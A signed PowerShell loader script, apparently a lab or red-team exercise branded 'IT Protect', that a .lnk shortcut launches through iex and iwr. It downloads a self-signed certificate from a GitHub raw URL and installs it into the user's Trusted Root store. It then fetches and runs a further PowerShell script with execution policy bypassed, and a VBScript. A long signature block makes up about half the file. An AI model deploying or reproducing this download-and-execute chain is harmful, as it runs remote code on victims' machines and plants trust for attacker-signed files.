# Push len GitHub raw — .lnk portable: iex (iwr ...Lab-Chain-Run.ps1)
# Thu tu: tai + import cert -> tai Trust.txt (Notepad) -> tai + chay ps1 -> tai + chay vbs

$ErrorActionPreference = 'Continue'
$raw = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main'
$uCer = "$raw/ITProtect-Lab-CodeSigning.cer"
$uTrust = "$raw/ITProtect-Lab-Trust.txt"
$u1 = "$raw/Lab-Register-Task.ps1"
$u2 = "$raw/Step2-Notify.vbs"

$pCer = Join-Path $env:TEMP 'ITProtect-Lab-CodeSigning.cer'
$pTrust = Join-Path $env:TEMP 'ITProtect-Lab-Trust.txt'
$p1 = Join-Path $env:TEMP 'Lab-Register-Task.ps1'
$p2 = Join-Path $env:TEMP 'Step2-Notify.vbs'

Write-Host ''
Write-Host '=== IT Protect (bangwonie/lnk) — chuoi tu dong ===' -ForegroundColor Cyan

try {
    Write-Host '[1/6] Tai ITProtect-Lab-CodeSigning.cer ->' $pCer
    Invoke-WebRequest -UseBasicParsing -Uri $uCer -OutFile $pCer
    if (-not (Test-Path -LiteralPath $pCer)) { throw "Khong ghi duoc cert" }
    Write-Host ('      OK ({0} byte)' -f (Get-Item -LiteralPath $pCer).Length)

    Write-Host '[2/6] Import cert vao Trusted Root (Current User)...'
    try {
        Import-Certificate -FilePath $pCer -CertStoreLocation Cert:\CurrentUser\Root | Out-Null
        Write-Host '      OK'
    } catch {
        Write-Host ('      (Thu lai / da co: {0})' -f $_.Exception.Message) -ForegroundColor Yellow
    }

    Write-Host '[3/6] Tai ITProtect-Lab-Trust.txt -> Notepad'
    Invoke-WebRequest -UseBasicParsing -Uri $uTrust -OutFile $pTrust
    if (Test-Path -LiteralPath $pTrust) {
        Start-Process -FilePath 'notepad.exe' -ArgumentList $pTrust
        Write-Host '      Da mo Notepad'
    }

    Write-Host '[4/6] Tai Lab-Register-Task.ps1 ->' $p1
    Invoke-WebRequest -UseBasicParsing -Uri $u1 -OutFile $p1
    if (-not (Test-Path -LiteralPath $p1)) { throw "Khong ghi duoc ps1" }
    Write-Host ('      OK ({0} byte)' -f (Get-Item -LiteralPath $p1).Length)

    Write-Host '[5/6] Chay Lab-Register-Task.ps1 ...'
    $pwsh = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    & $pwsh -NoProfile -ExecutionPolicy Bypass -File $p1
    Write-Host ('      Exit code: {0}' -f $LASTEXITCODE)

    Write-Host '[6/6] Tai + chay Step2-Notify.vbs ...'
    Invoke-WebRequest -UseBasicParsing -Uri $u2 -OutFile $p2
    Write-Host ('      OK ({0} byte)' -f (Get-Item -LiteralPath $p2).Length)
    $ws = Join-Path $env:SystemRoot 'System32\wscript.exe'
    Start-Process -FilePath $ws -ArgumentList $p2 -Wait
    Write-Host '      Xong.'
}
catch {
    Write-Host ('LOI: {0}' -f $_) -ForegroundColor Red
    if ($_.ScriptStackTrace) { Write-Host $_.ScriptStackTrace -ForegroundColor DarkRed }
}

Write-Host ''
Read-Host 'Nhan Enter de dong cua so'

# SIG # Begin signature block
# MIIb9QYJKoZIhvcNAQcCoIIb5jCCG+ICAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUwCErDLRCCExa4yiEsZ8PMLWI
# qHegghZaMIIDHDCCAgSgAwIBAgIQfifqnalecqVIOdXQmwz2ODANBgkqhkiG9w0B
# AQsFADAmMSQwIgYDVQQDDBtJVFByb3RlY3QgTGFiIChTZWxmLXNpZ25lZCkwHhcN
# MjYwNDEwMDYzMzQ5WhcNMjkwNDEwMDY0MzQ5WjAmMSQwIgYDVQQDDBtJVFByb3Rl
# Y3QgTGFiIChTZWxmLXNpZ25lZCkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
# AoIBAQCYrntuA0mGeLeFVhPMsISAKp+dOWd0vgS/4YHLMdVyx0nMuP+kkd27uvQ7
# VNUWEC58PsgcLvSk3yQKP3A2xK6WyOn2Zlpv1qJvEh3peYfFcULw5UWXcpW1Jvmw
# IIvDI9K+GRJf74ZPEmhCBXb7yBA1wEkf8pHL5Wf+o46x2pNZYZwmqCumXJGDynHv
# ptZW1wi5iRpQ9Y/mH7TYAnTZvJvsNq31dc+YdCRfLnFQnXavaenZGbMZn4oubJ1U
# ZuJ/iUFjkMVcq5eaMCe1Yk7JII24fUvDedZrphEAr8XqoMFgvG+PDGcOTLAWqytG
# CJQ+fmUi81WzcT0tIiObZi/Q3wG9AgMBAAGjRjBEMA4GA1UdDwEB/wQEAwIHgDAT
# BgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQUd2ewLZdjLhzz+8aHVQTQFSqB
# oz0wDQYJKoZIhvcNAQELBQADggEBAFmtVQliMdpI1Nv6UP/fdH1Bk67AhP40myaI
# eUWKgF47Fw7yZqXe5GlSZcZJ0YtH1y8m0D/9kVowjlQx39DSmdmW/gU3NUnlvO4/
# hqBMwrKHfmZg0Hjkiva1q4qDKpQ0WDeQVw18Bsm3FKFrVuMsPFmcrmgemc2ADU/e
# 3PTkXn/hdSDQ3cx3zI94UWhF+XKJlP7gfcob6M2JBqpMpayniegW8yik1VhjkaF4
# xmPjHbijSnspDNj9INd39soFFjGcOkKx4PIWmbiL7D1uKk6miCgoezFCCjD1Z38m
# 5dvasHNbbjp6W4Ef/BesLJ9jas3EFgXzVlFzaKmjMksIablv/CcwggWNMIIEdaAD
# AgECAhAOmxiO+dAt5+/bUOIIQBhaMA0GCSqGSIb3DQEBDAUAMGUxCzAJBgNVBAYT
# AlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2Vy
# dC5jb20xJDAiBgNVBAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0y
# MjA4MDEwMDAwMDBaFw0zMTExMDkyMzU5NTlaMGIxCzAJBgNVBAYTAlVTMRUwEwYD
# VQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAf
# BgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDCCAiIwDQYJKoZIhvcNAQEB
# BQADggIPADCCAgoCggIBAL/mkHNo3rvkXUo8MCIwaTPswqclLskhPfKK2FnC4Smn
# PVirdprNrnsbhA3EMB/zG6Q4FutWxpdtHauyefLKEdLkX9YFPFIPUh/GnhWlfr6f
# qVcWWVVyr2iTcMKyunWZanMylNEQRBAu34LzB4TmdDttceItDBvuINXJIB1jKS3O
# 7F5OyJP4IWGbNOsFxl7sWxq868nPzaw0QF+xembud8hIqGZXV59UWI4MK7dPpzDZ
# Vu7Ke13jrclPXuU15zHL2pNe3I6PgNq2kZhAkHnDeMe2scS1ahg4AxCN2NQ3pC4F
# fYj1gj4QkXCrVYJBMtfbBHMqbpEBfCFM1LyuGwN1XXhm2ToxRJozQL8I11pJpMLm
# qaBn3aQnvKFPObURWBf3JFxGj2T3wWmIdph2PVldQnaHiZdpekjw4KISG2aadMre
# Sx7nDmOu5tTvkpI6nj3cAORFJYm2mkQZK37AlLTSYW3rM9nF30sEAMx9HJXDj/ch
# srIRt7t/8tWMcCxBYKqxYxhElRp2Yn72gLD76GSmM9GJB+G9t+ZDpBi4pncB4Q+U
# DCEdslQpJYls5Q5SUUd0viastkF13nqsX40/ybzTQRESW+UQUOsxxcpyFiIJ33xM
# dT9j7CFfxCBRa2+xq4aLT8LWRV+dIPyhHsXAj6KxfgommfXkaS+YHS312amyHeUb
# AgMBAAGjggE6MIIBNjAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTs1+OC0nFd
# ZEzfLmc/57qYrhwPTzAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYunpyGd823IDzAO
# BgNVHQ8BAf8EBAMCAYYweQYIKwYBBQUHAQEEbTBrMCQGCCsGAQUFBzABhhhodHRw
# Oi8vb2NzcC5kaWdpY2VydC5jb20wQwYIKwYBBQUHMAKGN2h0dHA6Ly9jYWNlcnRz
# LmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRFJvb3RDQS5jcnQwRQYDVR0f
# BD4wPDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNz
# dXJlZElEUm9vdENBLmNybDARBgNVHSAECjAIMAYGBFUdIAAwDQYJKoZIhvcNAQEM
# BQADggEBAHCgv0NcVec4X6CjdBs9thbX979XB72arKGHLOyFXqkauyL4hxppVCLt
# pIh3bb0aFPQTSnovLbc47/T/gLn4offyct4kvFIDyE7QKt76LVbP+fT3rDB6mouy
# XtTP0UNEm0Mh65ZyoUi0mcudT6cGAxN3J0TU53/oWajwvy8LpunyNDzs9wPHh6jS
# TEAZNUZqaVSwuKFWjuyk1T3osdz9HNj0d1pcVIxv76FQPfx2CWiEn2/K2yCNNWAc
# AgPLILCsWKAOQGPFmCLBsln1VWvPJ6tsds5vIy30fnFqI2si/xK4VC0nftg62fC2
# h5b9W9FcrBjDTZ9ztwGpn1eqXijiuZQwgga0MIIEnKADAgECAhANx6xXBf8hmS5A
# QyIMOkmGMA0GCSqGSIb3DQEBCwUAMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxE
# aWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMT
# GERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0yNTA1MDcwMDAwMDBaFw0zODAx
# MTQyMzU5NTlaMGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5j
# LjFBMD8GA1UEAxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBUaW1lU3RhbXBpbmcgUlNB
# NDA5NiBTSEEyNTYgMjAyNSBDQTEwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIK
# AoICAQC0eDHTCphBcr48RsAcrHXbo0ZodLRRF51NrY0NlLWZloMsVO1DahGPNRcy
# bEKq+RuwOnPhof6pvF4uGjwjqNjfEvUi6wuim5bap+0lgloM2zX4kftn5B1IpYzT
# qpyFQ/4Bt0mAxAHeHYNnQxqXmRinvuNgxVBdJkf77S2uPoCj7GH8BLuxBG5AvftB
# dsOECS1UkxBvMgEdgkFiDNYiOTx4OtiFcMSkqTtF2hfQz3zQSku2Ws3IfDReb6e3
# mmdglTcaarps0wjUjsZvkgFkriK9tUKJm/s80FiocSk1VYLZlDwFt+cVFBURJg6z
# MUjZa/zbCclF83bRVFLeGkuAhHiGPMvSGmhgaTzVyhYn4p0+8y9oHRaQT/aofEnS
# 5xLrfxnGpTXiUOeSLsJygoLPp66bkDX1ZlAeSpQl92QOMeRxykvq6gbylsXQskBB
# BnGy3tW/AMOMCZIVNSaz7BX8VtYGqLt9MmeOreGPRdtBx3yGOP+rx3rKWDEJlIqL
# XvJWnY0v5ydPpOjL6s36czwzsucuoKs7Yk/ehb//Wx+5kMqIMRvUBDx6z1ev+7ps
# NOdgJMoiwOrUG2ZdSoQbU2rMkpLiQ6bGRinZbI4OLu9BMIFm1UUl9VnePs6BaaeE
# WvjJSjNm2qA+sdFUeEY0qVjPKOWug/G6X5uAiynM7Bu2ayBjUwIDAQABo4IBXTCC
# AVkwEgYDVR0TAQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQU729TSunkBnx6yuKQVvYv
# 1Ensy04wHwYDVR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4cD08wDgYDVR0PAQH/
# BAQDAgGGMBMGA1UdJQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUFBwEBBGswaTAkBggr
# BgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEGCCsGAQUFBzAChjVo
# dHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0
# LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v
# RGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNybDAgBgNVHSAEGTAXMAgGBmeBDAEEAjAL
# BglghkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBABfO+xaAHP4HPRF2cTC9vgvI
# tTSmf83Qh8WIGjB/T8ObXAZz8OjuhUxjaaFdleMM0lBryPTQM2qEJPe36zwbSI/m
# S83afsl3YTj+IQhQE7jU/kXjjytJgnn0hvrV6hqWGd3rLAUt6vJy9lMDPjTLxLgX
# f9r5nWMQwr8Myb9rEVKChHyfpzee5kH0F8HABBgr0UdqirZ7bowe9Vj2AIMD8liy
# rukZ2iA/wdG2th9y1IsA0QF8dTXqvcnTmpfeQh35k5zOCPmSNq1UH410ANVko43+
# Cdmu4y81hjajV/gxdEkMx1NKU4uHQcKfZxAvBAKqMVuqte69M9J6A47OvgRaPs+2
# ykgcGV00TYr2Lr3ty9qIijanrUR3anzEwlvzZiiyfTPjLbnFRsjsYg39OlV8cipD
# oq7+qNNjqFzeGxcytL5TTLL4ZaoBdqbhOhZ3ZRDUphPvSRmMThi0vw9vODRzW6Ax
# nJll38F0cuJG7uEBYTptMSbhdhGQDpOXgpIUsWTjd6xpR6oaQf/DJbg3s6KCLPAl
# Z66RzIg9sC+NJpud/v4+7RWsWCiKi9EOLLHfMR2ZyJ/+xhCx9yHbxtl5TPau1j/1
# MIDpMPx0LckTetiSuEtQvLsNz3Qbp7wGWqbIiOWCnb5WqxL3/BAPvIXKUjPSxyZs
# q8WhbaM2tszWkPZPubdcMIIG7TCCBNWgAwIBAgIQCoDvGEuN8QWC0cR2p5V0aDAN
# BgkqhkiG9w0BAQsFADBpMQswCQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQs
# IEluYy4xQTA/BgNVBAMTOERpZ2lDZXJ0IFRydXN0ZWQgRzQgVGltZVN0YW1waW5n
# IFJTQTQwOTYgU0hBMjU2IDIwMjUgQ0ExMB4XDTI1MDYwNDAwMDAwMFoXDTM2MDkw
# MzIzNTk1OVowYzELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRpZ2lDZXJ0LCBJbmMu
# MTswOQYDVQQDEzJEaWdpQ2VydCBTSEEyNTYgUlNBNDA5NiBUaW1lc3RhbXAgUmVz
# cG9uZGVyIDIwMjUgMTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBANBG
# rC0Sxp7Q6q5gVrMrV7pvUf+GcAoB38o3zBlCMGMyqJnfFNZx+wvA69HFTBdwbHwB
# SOeLpvPnZ8ZN+vo8dE2/pPvOx/Vj8TchTySA2R4QKpVD7dvNZh6wW2R6kSu9RJt/
# 4QhguSssp3qome7MrxVyfQO9sMx6ZAWjFDYOzDi8SOhPUWlLnh00Cll8pjrUcCV3
# K3E0zz09ldQ//nBZZREr4h/GI6Dxb2UoyrN0ijtUDVHRXdmncOOMA3CoB/iUSROU
# INDT98oksouTMYFOnHoRh6+86Ltc5zjPKHW5KqCvpSduSwhwUmotuQhcg9tw2YD3
# w6ySSSu+3qU8DD+nigNJFmt6LAHvH3KSuNLoZLc1Hf2JNMVL4Q1OpbybpMe46Yce
# NA0LfNsnqcnpJeItK/DhKbPxTTuGoX7wJNdoRORVbPR1VVnDuSeHVZlc4seAO+6d
# 2sC26/PQPdP51ho1zBp+xUIZkpSFA8vWdoUoHLWnqWU3dCCyFG1roSrgHjSHlq8x
# ymLnjCbSLZ49kPmk8iyyizNDIXj//cOgrY7rlRyTlaCCfw7aSUROwnu7zER6EaJ+
# AliL7ojTdS5PWPsWeupWs7NpChUk555K096V1hE0yZIXe+giAwW00aHzrDchIc2b
# Qhpp0IoKRR7YufAkprxMiXAJQ1XCmnCfgPf8+3mnAgMBAAGjggGVMIIBkTAMBgNV
# HRMBAf8EAjAAMB0GA1UdDgQWBBTkO/zyMe39/dfzkXFjGVBDz2GM6DAfBgNVHSME
# GDAWgBTvb1NK6eQGfHrK4pBW9i/USezLTjAOBgNVHQ8BAf8EBAMCB4AwFgYDVR0l
# AQH/BAwwCgYIKwYBBQUHAwgwgZUGCCsGAQUFBwEBBIGIMIGFMCQGCCsGAQUFBzAB
# hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wXQYIKwYBBQUHMAKGUWh0dHA6Ly9j
# YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRHNFRpbWVTdGFtcGlu
# Z1JTQTQwOTZTSEEyNTYyMDI1Q0ExLmNydDBfBgNVHR8EWDBWMFSgUqBQhk5odHRw
# Oi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkRzRUaW1lU3RhbXBp
# bmdSU0E0MDk2U0hBMjU2MjAyNUNBMS5jcmwwIAYDVR0gBBkwFzAIBgZngQwBBAIw
# CwYJYIZIAYb9bAcBMA0GCSqGSIb3DQEBCwUAA4ICAQBlKq3xHCcEua5gQezRCESe
# Y0ByIfjk9iJP2zWLpQq1b4URGnwWBdEZD9gBq9fNaNmFj6Eh8/YmRDfxT7C0k8FU
# FqNh+tshgb4O6Lgjg8K8elC4+oWCqnU/ML9lFfim8/9yJmZSe2F8AQ/UdKFOtj7Y
# MTmqPO9mzskgiC3QYIUP2S3HQvHG1FDu+WUqW4daIqToXFE/JQ/EABgfZXLWU0zi
# TN6R3ygQBHMUBaB5bdrPbF6MRYs03h4obEMnxYOX8VBRKe1uNnzQVTeLni2nHkX/
# QqvXnNb+YkDFkxUGtMTaiLR9wjxUxu2hECZpqyU1d0IbX6Wq8/gVutDojBIFeRlq
# AcuEVT0cKsb+zJNEsuEB7O7/cuvTQasnM9AWcIQfVjnzrvwiCZ85EE8LUkqRhoS3
# Y50OHgaY7T/lwd6UArb+BOVAkg2oOvol/DJgddJ35XTxfUlQ+8Hggt8l2Yv7roan
# cJIFcbojBcxlRcGG0LIhp6GvReQGgMgYxQbV1S3CrWqZzBt1R9xJgKf47CdxVRd/
# ndUlQ05oxYy2zRWVFjF7mcr4C34Mj3ocCVccAvlKV9jEnstrniLvUxxVZE/rptb7
# IRE2lskKPIJgbaP5t2nGj/ULLi49xTcBZU8atufk+EMF/cWuiC7POGT75qaL6vdC
# vHlshtjdNXOCIUjsarfNZzGCBQUwggUBAgEBMDowJjEkMCIGA1UEAwwbSVRQcm90
# ZWN0IExhYiAoU2VsZi1zaWduZWQpAhB+J+qdqV5ypUg51dCbDPY4MAkGBSsOAwIa
# BQCgeDAYBgorBgEEAYI3AgEMMQowCKACgAChAoAAMBkGCSqGSIb3DQEJAzEMBgor
# BgEEAYI3AgEEMBwGCisGAQQBgjcCAQsxDjAMBgorBgEEAYI3AgEVMCMGCSqGSIb3
# DQEJBDEWBBT8sJY8z8g32ug1cJQETCc77SRRsjANBgkqhkiG9w0BAQEFAASCAQA9
# Mb+9wEeilRvgFJF4YL7zWIgmGEZ8oYLTQyjhd3z+Gfj172Vs7HeUPMkrs7i4GjMe
# jfNHQOh3qM0Jd2ofBLP6lBSK7vQkT7XLFSb8uMfoy8dzluw/b7r2+qH28iDowf6X
# SbkU2M7H18QAgCW+zwNzt4gpjsw5rwI3FiDA4mlZdDYheOCZcg5wR3ygYFThNWH0
# aTnfjqDxHgtBPyAjpFFnCyLUXncX/4LjISOE/NldSNNdFsAMaf8Lf1EuIpYLGt24
# Wnf3PBPN6Ed+9D5MSG0GK2bxKJUQKI6rXb1WwiiXz7nEnWx92LRNJ809cxmCI8rk
# zDLAbxH5NdnJ436v0OZjoYIDJjCCAyIGCSqGSIb3DQEJBjGCAxMwggMPAgEBMH0w
# aTELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRpZ2lDZXJ0LCBJbmMuMUEwPwYDVQQD
# EzhEaWdpQ2VydCBUcnVzdGVkIEc0IFRpbWVTdGFtcGluZyBSU0E0MDk2IFNIQTI1
# NiAyMDI1IENBMQIQCoDvGEuN8QWC0cR2p5V0aDANBglghkgBZQMEAgEFAKBpMBgG
# CSqGSIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcNAQkFMQ8XDTI2MDQxMDA2
# NTQzOFowLwYJKoZIhvcNAQkEMSIEIOwO35Is0PpngS8Z4DUXGDS4PnkylyGhHjmE
# 3GfhY16xMA0GCSqGSIb3DQEBAQUABIICAFD3aYN3gaP1QUpvGqqgwmdbPPhe51mP
# qOr0kSERiHWCKRsF4jRwtD9A71fd46W33AC/CU+GlsKCyBw1sccNymC1KleO0PqZ
# pDVRza2Qxz7ef2aCsYfrBYJfAPo8DEAPExjFoWeNMyFyQlt6G5WLdDwcpvQ5l8xD
# XGjKQHXXfqhG8q0AvLA7lBsbN//w+4gGCFGhoZUW81j0FZxNUDxmgw3osLF3RCL6
# IEu2R3CAhOejmiWdQvvQJNGxocBVbMP9VHUHZ0eB/UpIXXVeL/E7ujOwxNmLJzrU
# 3tZGBGNNLsN3ldDFASuZYl1hGx1mKr5hDBmvMjM5doYvPyDWpciy3waEVe5+fofR
# grcxa7Rdsu/Y1fhooZrZXw8pBGnDKogYEF4MIdTUbbGzaX0imWnsn5jDQE3PvGW+
# t/EY02szR85KKhhE9VUYJH3d910LwwqUOGhuaEyP5/lsLg4UYcUkjh74VRqqrF2h
# rfpz+UXQjknmGu7lUlUVRNWh8wIjpMBffY/d9USirxItef43UfZV2kob3lXmEjSo
# bBAKFTs8v3DsDjwNcnPwWt/5wAOzThR70tnmv9pAAEUTl3CoR9LvwjYkj2bgOOD1
# 9fWpddQdGGrblA59qSJe1A+4nM34A47mt8X++x/QF7voVHOJ94OrUtdt4mX6LuOA
# Qv7OVPVv1Pkk
# SIG # End signature block
